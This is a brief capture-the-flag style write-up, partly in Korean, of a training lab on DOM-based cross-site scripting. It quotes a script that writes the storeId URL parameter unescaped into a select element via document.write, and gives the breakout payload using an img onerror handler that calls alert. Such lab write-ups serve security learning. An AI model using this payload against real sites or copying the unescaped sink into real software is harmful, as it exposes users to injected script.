# 🚩Lab: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. 
The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.


### 🔍 분석 및 공격 과정
1. sink가 존재하는 스크립트는 다음과 같다.
```html
<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
  document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
  if(stores[i] === store) {
    continue;
  }
  document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>
```
2.`storeId`라는 source가 존재함. 그리고 그 값은 <option selecte> </option> 사이에 들어가게 됨.
3. `storeId=<img src=1 onerror=alert()>`를 주면 alert 발생.


### 💡 취약점 원리
 source를 별다른 검증없이 sink로 보내는 경우 발생할 수 있는 DOM XSS 
